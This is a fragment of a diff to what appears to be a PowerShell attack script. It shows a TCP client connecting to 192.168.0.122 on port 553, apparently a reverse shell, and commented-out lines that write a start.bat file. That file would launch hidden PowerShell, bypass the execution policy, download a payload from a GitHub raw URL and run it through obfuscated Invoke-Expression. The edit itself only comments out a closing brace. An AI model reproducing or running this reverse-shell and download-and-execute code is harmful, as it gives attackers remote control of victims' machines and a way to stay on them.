@@ -6,7 +6,7 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.0.122',553);
 #if (Test-Path start.bat){
 #New-Item start.bat
 #Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon"
-}
+#}
 #if (Test-Path kep.ps1){
 #New-Item kep.ps1
 #Set-Content kep.ps1 '
